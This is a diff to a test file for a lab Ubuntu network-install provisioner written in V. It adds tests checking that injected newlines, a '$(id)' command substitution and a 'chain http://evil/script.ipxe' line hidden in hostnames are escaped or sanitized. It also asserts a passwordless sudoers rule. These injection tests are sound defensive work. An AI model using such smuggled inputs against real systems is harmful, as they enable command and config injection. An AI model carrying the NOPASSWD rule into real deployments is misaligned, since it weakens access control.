@@ -3,6 +3,7 @@ module ubuntu
 import core
 import os
 import sha512crypt
+import time
 
 fn sample_req() core.BootRequest {
 	return core.BootRequest{
@@ -56,15 +57,17 @@ fn test_http_mode_not_implemented() {
 fn test_user_data_zfs_defaults() {
 	ud := render_user_data(sample_req())
 	assert ud.starts_with('#cloud-config\n')
-	assert ud.contains('    hostname: vm-test')
-	assert ud.contains('    username: timi')
-	assert ud.contains("    password: '${fallback_password_hash}'")
+	assert ud.contains('    hostname: "vm-test"')
+	assert ud.contains('    username: "timi"')
+	assert ud.contains('    password: "${fallback_password_hash}"')
 	assert ud.contains('      name: zfs')
-	assert ud.contains("      - 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKey timi@workstation'")
-	assert ud.contains("      - 'ssh-rsa AAAAB3Nza example2'")
+	assert ud.contains('      - "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIExampleKey timi@workstation"')
+	assert ud.contains('      - "ssh-rsa AAAAB3Nza example2"')
 	assert ud.contains('zfs_arc_max=536870912')
 	assert ud.contains('zfs_arc_min=134217728')
 	assert ud.contains('update-initramfs -u')
+	assert ud.contains('timi ALL=(ALL) NOPASSWD:ALL')
+	assert ud.contains('/etc/sudoers.d/90-lab-nopasswd')
 	assert ud.contains('systemctl enable qemu-guest-agent')
 	assert ud.contains('mac=BC:24:11:00:24:99&hostname=vm-test')
 	assert ud.contains('http://192.168.250.10:8080/api/machines/installed')
@@ -76,8 +79,9 @@ fn test_user_data_custom_password_direct_layout_no_keys() {
 	req.storage_layout = .direct
 	req.ssh_keys = ''
 	ud := render_user_data(req)
-	assert ud.contains("    password: '$6$abc$def'")
+	assert ud.contains('    password: "$6$abc$def"')
 	assert ud.contains('      name: direct')
+	assert ud.contains('timi ALL=(ALL) NOPASSWD:ALL')
 	assert !ud.contains('zfs_arc_max')
 	assert !ud.contains('authorized-keys')
 }
@@ -89,13 +93,39 @@ fn test_user_data_storage_disk_match() {
 	req.storage_disk = '/dev/nvme1n1'
 	ud := render_user_data(req)
 	assert ud.contains('      match:')
-	assert ud.contains("        path: '/dev/nvme1n1'")
+	assert ud.contains('        path: "/dev/nvme1n1"')
+}
+
+fn test_user_data_escapes_injection() {
+	mut req := sample_req()
+	req.hostname = 'vm-test\n  malicious-key: 1'
+	req.username = "timi'$(id)"
+	ud := render_user_data(req)
+	// the injected newline stays inside the JSON-escaped double-quoted scalar
+	assert ud.contains('hostname: "vm-test\\n  malicious-key: 1"')
+	assert !ud.contains('\n  malicious-key:')
+	// the sudoers late-command shell-escapes the single quote
+	assert ud.contains("printf 'timi'\\''$(id) ALL=(ALL) NOPASSWD:ALL")
+	// the phone-home payload URL-encodes the hostname
+	assert ud.contains('hostname=vm-test%0A')
+	assert !ud.contains('hostname=vm-test\n')
+}
+
+fn test_nfs_install_script_sanitizes_hostname() {
+	u := new(new_assets('/nonexistent-cache', '', '', false))
+	mut req := sample_req()
+	req.hostname = 'vm\nchain http://evil/script.ipxe'
+	s := u.install_script(req)!
+	lines := s.split_into_lines()
+	assert lines.len == 5
+	assert lines[1] == 'echo lab-v-ipxe: installing vm-chain-http---evil-script.ipxe (ubuntu 24.04.5, NFS mode)'
+	assert !s.contains('\nchain http')
 }
 
 fn test_meta_data() {
 	md := render_meta_data(sample_req())
 	assert md.contains('instance-id: i-bc2411002499-0')
-	assert md.contains('local-hostname: vm-test')
+	assert md.contains('local-hostname: "vm-test"')
 	mut req := sample_req()
 	req.install_count = 3
 	assert render_meta_data(req).contains('instance-id: i-bc2411002499-3')
@@ -182,4 +212,120 @@ fn test_ensure_assets_ready_via_override() {
 fn test_extractor_detection_lists_at_least_one_on_dev_machine() {
 	tools := available_extractors()
 	assert tools.len > 0
+}
+
+fn tmp_dir_for(name string) string {
+	tmp := os.join_path(os.vtmp_dir(), 'labvipxe_${name}_${os.getpid()}')
+	os.rmdir_all(tmp) or {}
+	os.mkdir_all(tmp) or {}
+	return tmp
+}
+
+fn test_sha256_of_file_matches_known_vector() {
+	tmp := tmp_dir_for('sha256')
+	defer {
+		os.rmdir_all(tmp) or {}
+	}
+	path := os.join_path(tmp, 'abc.txt')
+	os.write_file(path, 'abc')!
+	assert sha256_of_file(path)! == 'ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad'
+}
+
+fn test_parse_sha256sums() {
+	body := 'c74833a55e525b1e99e1541509c566bb3e32bdb53bf27ea3347174364a57f47c *ubuntu-24.04.3-live-server-amd64.iso\n97f3d7ffb032c3eb3b23d2c8be9cc76e60c2c1f2c0146ba5ba9fe01cafae0fd8 *ubuntu-24.04.5-live-server-amd64.iso\ndeadbeef *short-hash.iso\n'
+	want := '97f3d7ffb032c3eb3b23d2c8be9cc76e60c2c1f2c0146ba5ba9fe01cafae0fd8'
+	assert parse_sha256sums(body, 'ubuntu-24.04.5-live-server-amd64.iso') or { '' } == want
+	assert parse_sha256sums(body, 'ubuntu-24.04.4-live-server-amd64.iso') == none
+	// a line whose digest is not 64 hex chars is ignored
+	assert parse_sha256sums(body, 'short-hash.iso') == none
+	assert parse_sha256sums('', 'anything.iso') == none
+}
+
+fn test_ensure_assets_claim_blocks_double_spawn() {
+	tmp := tmp_dir_for('claim')
+	defer {
+		os.rmdir_all(tmp) or {}
+	}
+	// a local ISO that cannot be extracted makes the worker fail fast without
+	// any network access
+	am := new_assets(tmp, '', '/no/such/ubuntu.iso', false)
+	am.ensure_assets('24.04')
+	am.ensure_assets('24.04') // a second boot request must not spawn a second worker
+	mut waited := 0
+	for waited < 100 && am.status_snapshot('24.04').phase !in [.failed, .ready] {
+		time.sleep(100 * time.millisecond)
+		waited++
+	}
+	st := am.status_snapshot('24.04')
+	assert st.phase == .failed
+	assert st.attempts == 1
+}
+
+fn test_failed_fetch_backoff_and_manual_retry() {
+	tmp := tmp_dir_for('backoff')
+	defer {
+		os.rmdir_all(tmp) or {}
+	}
+	am := new_assets(tmp, '', '/no/such/ubuntu.iso', false)
+	am.fail('24.04', 'simulated failure')
+	assert am.status_snapshot('24.04').attempts == 1
+	// inside the 30s backoff window an automatic retry must not start
+	am.ensure_assets('24.04')
+	time.sleep(300 * time.millisecond)
+	st := am.status_snapshot('24.04')
+	assert st.phase == .failed
+	assert st.attempts == 1
+	// the manual retry bypasses the backoff and runs the worker again
+	am.fetch_assets_now('24.04')
+	mut waited := 0
+	for waited < 100 && am.status_snapshot('24.04').attempts < 2 {
+		time.sleep(100 * time.millisecond)
+		waited++
+	}
+	assert am.status_snapshot('24.04').attempts == 2
+}
+
+fn test_failed_fetch_attempt_cap_blocks_auto_retry() {
+	tmp := tmp_dir_for('attemptcap')
+	defer {
+		os.rmdir_all(tmp) or {}
+	}
+	mut am := new_assets(tmp, '', '/no/such/ubuntu.iso', false)
+	am.fail('24.04', 'one')
+	am.fail('24.04', 'two')
+	am.fail('24.04', 'three')
+	assert am.status_snapshot('24.04').attempts == max_auto_attempts
+	// pretend the backoff window has long expired, so only the cap can block
+	am.mu.lock()
+	mut st := am.statuses['24.04'] or { AssetStatus{ version: '24.04' } }
+	st.last_fail_at = 0
+	am.statuses['24.04'] = st
+	am.mu.unlock()
+	am.ensure_assets('24.04')
+	time.sleep(300 * time.millisecond)
+	st = am.status_snapshot('24.04')
+	assert st.phase == .failed
+	assert st.attempts == max_auto_attempts
+}
+
+fn test_failed_fetch_auto_retry_after_backoff() {
+	tmp := tmp_dir_for('retry')
+	defer {
+		os.rmdir_all(tmp) or {}
+	}
+	mut am := new_assets(tmp, '', '/no/such/ubuntu.iso', false)
+	am.fail('24.04', 'transient failure')
+	// pretend the backoff window already elapsed
+	am.mu.lock()
+	mut st := am.statuses['24.04'] or { AssetStatus{ version: '24.04' } }
+	st.last_fail_at = 0
+	am.statuses['24.04'] = st
+	am.mu.unlock()
+	am.ensure_assets('24.04')
+	mut waited := 0
+	for waited < 100 && am.status_snapshot('24.04').attempts < 2 {
+		time.sleep(100 * time.millisecond)
+		waited++
+	}
+	assert am.status_snapshot('24.04').attempts == 2
 }
